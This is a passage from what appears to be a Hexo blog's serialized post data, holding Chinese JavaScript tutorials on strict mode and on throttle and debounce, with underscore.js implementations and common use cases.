class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123; </span><br><span class=\"line\"><span class=\"meta\">  \"use strict\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"comment\">// 返回true，因为严格模式下，this的值为undefined，所以\"!this\"为true。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"meta\">  \"use strict\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.a = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">f();    <span class=\"comment\">// 报错，this未定义</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>use strict</code> 指令只运行出现在脚本或函数的开头。</p>\n</li>\n</ul>\n<h4 id=\"4、保留关键字\"><a href=\"#4、保留关键字\" class=\"headerlink\" title=\"4、保留关键字\"></a><a name=\"key\">4、保留关键字</a></h4><ul>\n<li><strong>为了向将来Javascript的新版本过渡，严格模式新增了一些 <code>保留关键字</code>：</strong><ul>\n<li>implements</li>\n<li>interface</li>\n<li>let</li>\n<li>package</li>\n<li>private</li>\n<li>protected</li>\n<li>public</li>\n<li>static</li>\n<li>yield</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"5、严格模式下的规则\"><a href=\"#5、严格模式下的规则\" class=\"headerlink\" title=\"5、严格模式下的规则\"></a><a name=\"#regulation\">5、严格模式下的规则</a></h4><ul>\n<li>变量不能未声明就使用</li>\n<li>函数参数必须有唯一的名称 （否则会被认为是语法错误）</li>\n<li><code>with</code> 语句被禁止使用</li>\n<li>赋值给只读属性会抛出一个错误</li>\n<li>像 <code>00840</code> 这样的八进制数是语法错误</li>\n<li>尝试 <code>delete</code> 不可删除的数据会抛出一个错误</li>\n<li><code>delete prop</code> 被认为是语法错误, 只能删除属性 <code>delete global[prop]</code></li>\n<li><code>eval</code> 不会引入新的变量到它的作用域</li>\n<li><code>eval</code> 和 <code>arguments</code> 的绑定不会被改变</li>\n<li><code>arguments</code> 不会神奇地跟踪方法参数的变化</li>\n<li>不再支持 <code>arguments.callee</code>，使用它会抛出 <code>TypeError</code></li>\n<li>不再支持 <code>arguments.caller</code>，使用它会抛出 <code>TypeError</code></li>\n<li>上下文作为 <code>this</code> 在方法调用时不会被强制包装成一个 <code>Object</code>（即 <code>this</code> 不会指向全局对象）</li>\n<li>不再能够使用 <code>fn.caller</code> 和 <code>fn.arguments</code> 访问 <code>JavaScript</code> 的堆栈</li>\n<li>保留字(例如 <code>protected</code>, <code>static</code>, <code>interface</code>等等)不能被作为新变量声明 <a href=\"#key\">保留关键字</a></li>\n</ul>\n"},{"id":"0809025","title":"函数节流(throttle)和函数去抖(debounce)","date":"2017-08-07T12:14:46.000Z","_content":"\n> 记得之前有一个需求，就是用户在输入框中输入关键字，然后根据关键字去拉取后台模糊搜索的数据。如果通过监听用户输入 `oninput` 发送请求的话，触发频率就太高了...于是上网搜了一下，最后是使用 `debounce` 解决了问题。本文主要是总结一下函数节流 `throttle` 和函数去抖 `debounce`。\n\n#### <a>1、throttle和debounce是什么？</a>\n\n- 某些场景下，比如响应鼠标移动或者窗口大小调整的事件，触发频率比较高。若稍处理函数微复杂，需要较多的运算执行时间，响应速度跟不上触发频率，往往会出现延迟，导致假死或者卡顿感。\n\n\n- 在运算资源不够的时候，最直观的解决办法就是升级硬件，诚然通过购买更好的硬件可以解决部分问题，但是也需要为此付出高额的成本。特别是客户端和服务器模式，要求客户端统一升级硬件基本不可能。\n\n\n- 在资源有限的前提下，处理函数无法即时响应高频调用。退而求其次，只响应部分请求是否可行呢？某些场景下的密集性请求，具备很强的同质和连续性。比如说，鼠标移动的轨迹参数。响应越及时效果越平滑，但是如果响应速度跟不上时，反而会出现卡顿感，如果适当的丢弃一些请求效果更流畅。\n\n\n- `throttle` 和 `debounce` 是解决请求和响应速度不匹配问题的两个方案。二者的`差异在于选择不同的策略`。\n\n\n- **如何理解具体的理解 `throttle` 和 `debounce` 呢：**(就拿我们在文本框输入文本，然后发送请求，输出后台返回数据)\n  - `throttle：` 当用户第一次输入时，3秒后准时发送请求，不会等待你的第二次输入。如果不输入就不触发请求。\n  - `debounce：` 每当用户输入时，都会等待3秒，如果中间持续输入，那么还会等待3秒，直到超过3秒没有输入，才会发送请求。\n\n#### <a>2、使用throttle和debounce</a>\n\n  **来看看 [underscore](http://underscorejs.org/) 是怎么实现的吧：**\n\n- `throttle：`\n```js\n/**\n * 频率控制 返回函数连续调用时，func 执行频率限定为 次 / wait\n * \n * @param  {function}   func      传入函数\n * @param  {number}     wait      表示时间窗口的间隔\n * @param  {object}     options   如果想忽略开始边界上的调用，传入{leading: false}。\n *                                如果想忽略结尾边界上的调用，传入{trailing: false}\n * @return {function}             返回客户调用函数   \n */\n_.throttle = function(func, wait, options) {\n  var context, args, result;\n  var timeout = null;\n  // 上次执行时间点\n  var previous = 0;\n  if (!options) options = {};\n  // 延迟执行函数\n  var later = function() {\n    // 若设定了开始边界不执行选项，上次执行时间始终为0\n    previous = options.leading === false ? 0 : _.now();\n    timeout = null;\n    result = func.apply(context, args);\n    if (!timeout) context = args = null;\n  };\n  return function() {\n    var now = _.now();\n    // 首次执行时，如果设定了开始边界不执行选项，将上次执行时间设定为当前时间。\n    if (!previous && options.leading === false) previous = now;\n    // 延迟执行时间间隔\n    var remaining = wait - (now - previous);\n    context = this;\n    args = arguments;\n    // 延迟时间间隔remaining小于等于0，表示上次执行至此所间隔时间已经超过一个时间窗口\n    // remaining大于时间窗口wait，表示客户端系统时间被调整过\n    if (remaining <= 0 || remaining > wait) {\n      clearTimeout(timeout);\n      timeout = null;\n      previous = now;\n      result = func.apply(context, args);\n      if (!timeout) context = args = null;\n    //如果延迟执行不存在，且没有设定结尾边界不执行选项\n    } else if (!timeout && options.trailing !== false) {\n      timeout = setTimeout(later, remaining);\n    }\n    return result;\n  };\n};\n```\n\n- `debounce：`\n```js\n/**\n * 空闲控制 返回函数连续调用时，空闲时间必须大于或等于 wait，func 才会执行\n *\n * @param  {function} func        传入函数(实际要执行的函数)\n * @param  {number}   wait        表示时间窗口的间隔\n * @param  {boolean}  immediate   设置为ture时，调用触发于开始边界而不是结束边界\n * @return {function}             返回客户调用函数\n */\n_.debounce = function(func, wait, immediate) {\n  var timeout, args, context, timestamp, result;\n\n  var later = function() {\n    // 据上一次触发时间间隔\n    var last = _.now() - timestamp;\n\n    // 上次被包装函数被调用时间间隔last小于设定时间间隔wait\n    if (last < wait && last > 0) {\n      timeout = setTimeout(later, wait - last);\n    } else {\n      timeout = null;\n      // 如果设定为immediate===true，因为开始边界已经调用过了此处无需调用\n      if (!immediate) {\n        result = func.apply(context, args);\n        if (!timeout) context = args = null;\n      }\n    }\n  };\n\n  return function() {\n    context = this;\n    args = arguments;\n    timestamp = _.now();\n    var callNow = immediate && !timeout;\n    // 如果延时不存在，重新设定延时\n    if (!timeout) timeout = setTimeout(later, wait);\n    if (callNow) {\n      result = func.apply(context, args);\n      context = args = null;\n    }\n\n    return result;\n  };\n};\n```\n\n#### <a>3、使用场景</a>\n\n  **只要牵涉到连续事件或频率控制相关的应用都可以考虑到这两个函数，比如：**\n- 游戏射击，keydown 事件\n- 文本输入、自动完成，keyup 事件\n- 鼠标移动，mousemove 事件\n- DOM 元素动态定位，window 对象的 resize 和 scroll 事件\n\n前两者 debounce 和 throttle 都可以按需使用；后两者肯定是用 throttle 了。如果不做过滤处理，每秒种甚至会触发数十次相应的事件。尤其是 mousemove 事件，每移动一像素都可能触发一次事件。如果是在一个画布上做一个鼠标相关的应用，过滤事件处理是必须的，否则肯定会造成糟糕的体验。","source":"_posts/0809025_函数节流-throttle-和函数去抖-debounce.md","raw":"---\nid: 0809025\ntitle: 函数节流(throttle)和函数去抖(debounce)\ndate: 2017-08-07 20:14:46\ntags:\n  - JavaScript\ncategories:\n---\n\n> 记得之前有一个需求，就是用户在输入框中输入关键字，然后根据关键字去拉取后台模糊搜索的数据。如果通过监听用户输入 `oninput` 发送请求的话，触发频率就太高了...于是上网搜了一下，最后是使用 `debounce` 解决了问题。本文主要是总结一下函数节流 `throttle` 和函数去抖 `debounce`。\n\n#### <a>1、throttle和debounce是什么？</a>\n\n- 某些场景下，比如响应鼠标移动或者窗口大小调整的事件，触发频率比较高。若稍处理函数微复杂，需要较多的运算执行时间，响应速度跟不上触发频率，往往会出现延迟，导致假死或者卡顿感。\n\n\n- 在运算资源不够的时候，最直观的解决办法就是升级硬件，诚然通过购买更好的硬件可以解决部分问题，但是也需要为此付出高额的成本。特别是客户端和服务器模式，要求客户端统一升级硬件基本不可能。\n\n\n- 在资源有限的前提下，处理函数无法即时响应高频调用。退而求其次，只响应部分请求是否可行呢？某些场景下的密集性请求，具备很强的同质和连续性。比如说，鼠标移动的轨迹参数。响应越及时效果越平滑，但是如果响应速度跟不上时，反而会出现卡顿感，如果适当的丢弃一些请求效果更流畅。\n\n\n- `throttle` 和 `debounce` 是解决请求和响应速度不匹配问题的两个方案。二者的`差异在于选择不同的策略`。\n\n\n- **如何理解具体的理解 `throttle` 和 `debounce` 呢：**(就拿我们在文本框输入文本，然后发送请求，输出后台返回数据)\n  - `throttle：` 当用户第一次输入时，3秒后准时发送请求，不会等待你的第二次输入。如果不输入就不触发请求。\n  - `debounce：` 每当用户输入时，都会等待3秒，如果中间持续输入，那么还会等待3秒，直到超过3秒没有输入，才会发送请求。\n\n#### <a>2、使用throttle和debounce</a>\n\n  **来看看 [underscore](http://underscorejs.org/) 是怎么实现的吧：**\n\n- `throttle：`\n```js\n/**\n * 频率控制 返回函数连续调用时，func 执行频率限定为 次 / wait\n * \n * @param  {function}   func      传入函数\n * @param  {number}     wait      表示时间窗口的间隔\n * @param  {object}     options   如果想忽略开始边界上的调用，传入{leading: false}。\n *                                如果想忽略结尾边界上的调用，传入{trailing: false}\n * @return {function}             返回客户调用函数   \n */\n_.throttle = function(func, wait, options) {\n  var context, args, result;\n  var timeout = null;\n  // 上次执行时间点\n  var previous = 0;\n  if (!options) options = {};\n  // 延迟执行函数\n  var later = function() {\n    // 若设定了开始边界不执行选项，上次执行时间始终为0\n    previous = options.leading === false ? 0 : _.now();\n    timeout = null;\n    result = func.apply(context, args);\n    if (!timeout) context = args = null;\n  };\n  return function() {\n    var now = _.now();\n    // 首次执行时，如果设定了开始边界不执行选项，将上次执行时间设定为当前时间。\n    if (!previous && options.leading === false) previous = now;\n    // 延迟执行时间间隔\n    var remaining = wait - (now - previous);\n    context = this;\n    args = arguments;\n    // 延迟时间间隔remaining小于等于0，表示上次执行至此所间隔时间已经超过一个时间窗口\n    // remaining大于时间窗口wait，表示客户端系统时间被调整过\n    if (remaining <= 0 || remaining > wait) {\n      clearTimeout(timeout);\n      timeout = null;\n      previous = now;\n      result = func.apply(context, args);\n      if (!timeout) context = args = null;\n    //如果延迟执行不存在，且没有设定结尾边界不执行选项\n    } else if (!timeout && options.trailing !== false) {\n      timeout = setTimeout(later, remaining);\n    }\n    return result;\n  };\n};\n```\n\n- `debounce：`\n```js\n/**\n * 空闲控制 返回函数连续调用时，空闲时间必须大于或等于 wait，func 才会执行\n *\n * @param  {function} func        传入函数(实际要执行的函数)\n * @param  {number}   wait        表示时间窗口的间隔\n * @param  {boolean}  immediate   设置为ture时，调用触发于开始边界而不是结束边界\n * @return {function}             返回客户调用函数\n */\n_.debounce = function(func, wait, immediate) {\n  var timeout, args, context, timestamp, result;\n\n  var later = function() {\n    // 据上一次触发时间间隔\n    var last = _.now() - timestamp;\n\n    // 上次被包装函数被调用时间间隔last小于设定时间间隔wait\n    if (last < wait && last > 0) {\n      timeout = setTimeout(later, wait - last);\n    } else {\n      timeout = null;\n      // 如果设定为immediate===true，因为开始边界已经调用过了此处无需调用\n      if (!immediate) {\n        result = func.apply(context, args);\n        if (!timeout) context = args = null;\n      }\n    }\n  };\n\n  return function() {\n    context = this;\n    args = arguments;\n    timestamp = _.now();\n    var callNow = immediate && !timeout;\n    // 如果延时不存在，重新设定延时\n    if (!timeout) timeout = setTimeout(later, wait);\n    if (callNow) {\n      result = func.apply(context, args);\n      context = args = null;\n    }\n\n    return result;\n  };\n};\n```\n\n#### <a>3、使用场景</a>\n\n  **只要牵涉到连续事件或频率控制相关的应用都可以考虑到这两个函数，比如：**\n- 游戏射击，keydown 事件\n- 文本输入、自动完成，keyup 事件\n- 鼠标移动，mousemove 事件\n- DOM 元素动态定位，window 对象的 resize 和 scroll 事件\n\n前两者 debounce 和 throttle 都可以按需使用；后两者肯定是用 throttle 了。如果不做过滤处理，每秒种甚至会触发数十次相应的事件。尤其是 mousemove 事件，每移动一像素都可能触发一次事件。如果是在一个画布上做一个鼠标相关的应用，过滤事件处理是必须的，否则肯定会造成糟糕的体验。","slug":"0809025_函数节流-throttle-和函数去抖-debounce","published":1,"updated":"2018-03-26T12:21:20.715Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvue0012s4c0r4bfim7k","content":"<blockquote>\n<p>记得之前有一个需求，就是用户在输入框中输入关键字，然后根据关键字去拉取后台模糊搜索的数据。如果通过监听用户输入 <code>oninput</code> 发送请求的话，触发频率就太高了…于是上网搜了一下，最后是使用 <code>debounce</code> 解决了问题。本文主要是总结一下函数节流 <code>throttle</code> 和函数去抖 <code>debounce</code>。</p>\n</blockquote>\n<h4 id=\"1、throttle和debounce是什么？\"><a href=\"#1、throttle和debounce是什么？\" class=\"headerlink\" title=\"1、throttle和debounce是什么？\"></a><a>1、throttle和debounce是什么？</a></h4><ul>\n<li>某些场景下，比如响应鼠标移动或者窗口大小调整的事件，触发频率比较高。若稍处理函数微复杂，需要较多的运算执行时间，响应速度跟不上触发频率，往往会出现延迟，导致假死或者卡顿感。</li>\n</ul>\n<ul>\n<li>在运算资源不够的时候，最直观的解决办法就是升级硬件，诚然通过购买更好的硬件可以解决部分问题，但是也需要为此付出高额的成本。特别是客户端和服务器模式，要求客户端统一升级硬件基本不可能。</li>\n</ul>\n<ul>\n<li>在资源有限的前提下，处理函数无法即时响应高频调用。退而求其次，只响应部分请求是否可行呢？某些场景下的密集性请求，具备很强的同质和连续性。比如说，鼠标移动的轨迹参数。响应越及时效果越平滑，但是如果响应速度跟不上时，反而会出现卡顿感，如果适当的丢弃一些请求效果更流畅。</li>\n</ul>\n<ul>\n<li><code>throttle</code> 和 <code>debounce</code> 是解决请求和响应速度不匹配问题的两个方案。二者的<code>差异在于选择不同的策略</code>。</li>\n</ul>\n<ul>\n<li><strong>如何理解具体的理解 <code>throttle</code> 和 <code>debounce</code> 呢：</strong>(就拿我们在文本框输入文本，然后发送请求，输出后台返回数据)<ul>\n<li><code>throttle：</code> 当用户第一次输入时，3秒后准时发送请求，不会等待你的第二次输入。如果不输入就不触发请求。</li>\n<li><code>debounce：</code> 每当用户输入时，都会等待3秒，如果中间持续输入，那么还会等待3秒，直到超过3秒没有输入，才会发送请求。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2、使用throttle和debounce\"><a href=\"#2、使用throttle和debounce\" class=\"headerlink\" title=\"2、使用throttle和debounce\"></a><a>2、使用throttle和debounce</a></h4><p>  <strong>来看看 <a href=\"http://underscorejs.org/\" target=\"_blank\" rel=\"noopener\">underscore</a> 是怎么实现的吧：</strong></p>\n<ul>\n<li><p><code>throttle：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 频率控制 返回函数连续调用时，func 执行频率限定为 次 / wait</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;function&#125;   func      传入函数</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;number&#125;     wait      表示时间窗口的间隔</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;object&#125;     options   如果想忽略开始边界上的调用，传入&#123;leading: false&#125;。</span></span><br><span class=\"line\"><span class=\"comment\"> *                                如果想忽略结尾边界上的调用，传入&#123;trailing: false&#125;</span></span><br><span class=\"line\"><span class=\"comment\"> * @return &#123;function&#125;             返回客户调用函数   </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">_.throttle = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">func, wait, options</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> context, args, result;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"comment\">// 上次执行时间点</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> previous = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!options) options = &#123;&#125;;</span><br><span class=\"line\">  <span class=\"comment\">// 延迟执行函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> later = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 若设定了开始边界不执行选项，上次执行时间始终为0</span></span><br><span class=\"line\">    previous = options.leading === <span class=\"literal\">false</span> ? <span class=\"number\">0</span> : _.now();</span><br><span class=\"line\">    timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    result = func.apply(context, args);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!timeout) context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> now = _.now();</span><br><span class=\"line\">    <span class=\"comment\">// 首次执行时，如果设定了开始边界不执行选项，将上次执行时间设定为当前时间。</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!previous &amp;&amp; options.leading === <span class=\"literal\">false</span>) previous = now;</span><br><span class=\"line\">    <span class=\"comment\">// 延迟执行时间间隔</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> remaining = wait - (now - previous);</span><br><span class=\"line\">    context = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 延迟时间间隔remaining小于等于0，表示上次执行至此所间隔时间已经超过一个时间窗口</span></span><br><span class=\"line\">    <span class=\"comment\">// remaining大于时间窗口wait，表示客户端系统时间被调整过</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (remaining &lt;= <span class=\"number\">0</span> || remaining &gt; wait) &#123;</span><br><span class=\"line\">      clearTimeout(timeout);</span><br><span class=\"line\">      timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      previous = now;</span><br><span class=\"line\">      result = func.apply(context, args);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!timeout) context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"comment\">//如果延迟执行不存在，且没有设定结尾边界不执行选项</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!timeout &amp;&amp; options.trailing !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">      timeout = setTimeout(later, remaining);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>debounce：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 空闲控制 返回函数连续调用时，空闲时间必须大于或等于 wait，func 才会执行</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;function&#125; func        传入函数(实际要执行的函数)</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;number&#125;   wait        表示时间窗口的间隔</span></span><br><span class=\"line\"><span class=\"comment\"> * @param  &#123;boolean&#125;  immediate   设置为ture时，调用触发于开始边界而不是结束边界</span></span><br><span class=\"line\"><span class=\"comment\"> * @return &#123;function&#125;             返回客户调用函数</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">_.debounce = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">func, wait, immediate</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> timeout, args, context, timestamp, result;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> later = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 据上一次触发时间间隔</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> last = _.now() - timestamp;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 上次被包装函数被调用时间间隔last小于设定时间间隔wait</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (last &lt; wait &amp;&amp; last &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      timeout = setTimeout(later, wait - last);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      timeout = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"comment\">// 如果设定为immediate===true，因为开始边界已经调用过了此处无需调用</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!immediate) &#123;</span><br><span class=\"line\">        result = func.apply(context, args);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!timeout) context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    context = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    timestamp = _.now();</span><br><span class=\"line\">    <span class=\"keyword\">var</span> callNow = immediate &amp;&amp; !timeout;</span><br><span class=\"line\">    <span class=\"comment\">// 如果延时不存在，重新设定延时</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!timeout) timeout = setTimeout(later, wait);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (callNow) &#123;</span><br><span class=\"line\">      result = func.apply(context, args);</span><br><span class=\"line\">      context = args = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"3、使用场景\"><a href=\"#3、使用场景\" class=\"headerlink\" title=\"3、使用场景\"></a><a>3、使用场景</a></h4><p>  <strong>只要牵涉到连续事件或频率控制相关的应用都可以考虑到这两个函数，比如：</strong></p>\n<ul>\n<li>游戏射击，keydown 事件</li>\n<li>文本输入、自动完成，keyup 事件</li>\n<li>鼠标移动，mousemove 事件</li>\n<li>DOM 元素动态定位，window 对象的 resize 和 scroll 事件</li>\n</ul>\n<p>前两者 debounce 和 throttle 都可以按需使用；后两者肯定是用 throttle 了。如果不做过滤处理，每秒种甚至会触发数十次相应的事件。尤其是 mousemove 事件，每移动一像素都可能触发一次事件。如果是在一个画布上做一个鼠标相关的应用，过滤事件处理是必须的，否则肯定会造成糟糕的体验。</p>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>记得之前有一个需求，就是用户在输入框中输入关键字，然后根据关键字去拉取后台模糊搜索的数据。如果通过监听用户输入 <code>oninput</code> 发送请求的话，触发频率就太高了…于是上网搜了一下，最后是使用 <code>debounce</code> 解决了问题。本文主要是总结一下函数节流 <code>throttle</code> 和函数去抖 <code>debounce</code>。</p>\n</blockquote>\n<h4 id=\"1、throttle和debounce是什么？\"><a href=\"#1、throttle和debounce是什么？\" class=\"headerlink\" title=\"1、throttle和debounce是什么？\"></a><a>1、throttle和debounce是什么？</a></h4><ul>\n<li>某些场景下，比如响应鼠标移动或者窗口大小调整的事件，触发频率比较高。若稍处理函数微复杂，需要较多的运算执行时间，响应速度跟不上触发频率，往往会出现延迟，导致假死或者卡顿感。</li>\n</ul>\n<ul>\n<li>在运算资源不够的时候，最直观的解决办法就是升级硬件，诚然通过购买更好的硬件可以解决部分问题，但是也需要为此付出高额的成本。特别是客户端和服务器模式，要求客户端统一升级硬件基本不可能。</li>\n</ul>\n<ul>\n<li>在资源有限的前提下，处理函数无法即时响应高频调用。退而求其次，只响应部分请求是否可行呢？某些场景下的密集性请求，具备很强的同质和连续性。比如说，鼠标移动的轨迹参数。响应越及时效果越平滑，但是如果响应速度跟不上时，反而会出现卡顿感，如果适当的丢弃一些请求效果更流畅。</li>\n</ul>\n<ul>\n<li><code>throttle</code> 和 <code>debounce</code> 是解决请求和响应速度不匹配问题的两个方案。二者的<code>差异在于选择不同的策略</code>。</li>\n</ul>\n<ul>\n<li><strong>如何理解具体的理解 <code>throttle</code> 和 <code>debounce</code> 呢：</strong>(就拿我们在文本框输入文本，然后发送请求，输出后台返回数据)<ul>\n<li><code>throttle：</code> 当用户第一次输入时，3秒后准时发送请求，不会等待你的第二次输入。如果不输入就不触发请求。</li>\n<li><code>debounce：</code> 每当用户输入时，都会等待3秒，如果中间持续输入，那么还会等待3秒，直到超过3秒没有输入，才会发送请求。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2、使用throttle和debounce\"><a href=\"#2、使用throttle和debounce\" class=\"headerlink\" title=\"2、使用throttle和debounce\"></a><a>2、使用throttle和debounce</a></h4><p>  <strong>来看看 <a href=\"http://underscorejs.org/\" target=\"_blank\" rel=\"noopener\">underscore</a> 是怎么实现的吧：</strong></p>\n<ul>\n<li><p><code>throttle：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span 